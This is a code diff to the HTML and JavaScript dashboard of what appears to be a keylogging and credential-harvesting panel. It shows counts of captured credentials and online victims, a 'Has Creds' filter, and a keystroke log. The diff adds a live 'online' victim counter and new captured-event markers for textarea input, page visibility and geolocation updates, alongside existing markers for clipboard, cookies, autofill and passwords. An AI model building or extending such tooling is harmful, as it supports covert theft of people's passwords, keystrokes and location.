@@ -396,6 +396,7 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
             <button id="qf-creds" class="btn qf-btn" onclick="setQuickFilter('creds')" style="font-size:.6rem;padding:3px 8px;border-color:#f4b400;color:#f4b400">🔑 Has Creds</button>
             <button id="qf-errors" class="btn qf-btn" onclick="setQuickFilter('errors')" style="font-size:.6rem;padding:3px 8px;border-color:#d93025;color:#d93025">⚠️ Has Errors</button>
             <button id="live-mode-btn" class="btn" onclick="toggleLiveMode()" style="font-size:.6rem;padding:3px 10px;margin-left:8px">⚡ Live Mode</button>
+            <span id="online-count-badge" style="font-size:.6rem;padding:3px 8px;margin-left:6px;background:rgba(11,138,11,.15);color:#0b8a0b;border-radius:10px;font-weight:600;display:none">🟢 0 online</span>
         </div>
     </div>
         <div class="tabs">
@@ -1505,6 +1506,12 @@ async function refreshAll() {
                 updateTabBadge('visits', stats.visitCount || 0);
                 updateTabBadge('creds',  stats.credentialCount || 0);
                 $('#cl-badge').textContent = stats.onlineCount || 0;
+                const ocBadge = $('#online-count-badge');
+                if (ocBadge) {
+                    const oc = stats.onlineCount || 0;
+                    ocBadge.textContent = `🟢 ${oc} online`;
+                    ocBadge.style.display = oc > 0 ? 'inline' : 'none';
+                }
                 deviceInfo = stats.deviceInfo || {};
                 renderClients(stats.clients);
                 updateFilterOptions(stats.clients);
@@ -1637,7 +1644,8 @@ function renderKeystrokes(keys) {
         'WEBSOCKET': '#38bdf8', 'FETCH': '#7dd3fc', 'XHR': '#93c5fd',
         'INPUT TYPE': '#fb7185', 'BEACON': '#c084fc', 'STORAGE SIZE': '#fde68a',
         'HISTORY': '#a5f3fc', 'CLIPBOARD WRITE': '#bbf7d0', 'SPA NAV': '#a5f3fc',
-        'PASSWORD STRENGTH': '#f9a8d4'
+        'PASSWORD STRENGTH': '#f9a8d4',
+        'TEXTAREA': '#fde68a', 'VISIBILITY': '#bfdbfe', 'GEO UPDATE': '#6ee7b7'
     };
     function colorizeMarker(text) {
         // Color special [MARKER ...] prefixes
@@ -1651,7 +1659,7 @@ function renderKeystrokes(keys) {
         let highlighted = safe.replace(/\[(BS|ENTER|TAB|ESC|DEL|UP|DN|LT|RT)\]/g,
             '<span class="special">[$1]</span>');
         highlighted = colorizeMarker(highlighted);
-        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR|BEACON|STORAGE|HISTORY|CLIPBOARD|SPA|PASSWORD)/.test(k.keys || '');
+        const isSpecial = /\[(?:PASTE|LINK|SCROLL|RESIZE|IDLE|VISIBLE|HIDDEN|PAGE|WEBRTC|AUTOFILL|DEVICE|BATTERY|COPY|CUT|PRINT|NETWORK|FIELD|INPUT|TIMEZONE|LOCAL|SESSION|MEDIA|MOTION|COOKIES|PERF|FORM|RAGE|NAVIGATOR|FONTS|WEBSOCKET|FETCH|XHR|BEACON|STORAGE|HISTORY|CLIPBOARD|SPA|PASSWORD|TEXTAREA|VISIBILITY|GEO)/.test(k.keys || '');
         return `<div class="key-entry"${isSpecial ? ' style="background:rgba(148,163,184,.05)"' : ''}>
             <div class="key-hdr"><span class="key-id">${escHtml(k.clientId)}</span><span class="key-time">${fmtTime(k.timestamp)}</span></div>
             ${k.url ? `<div class="key-url">${escHtml(k.url)}</div>` : ''}
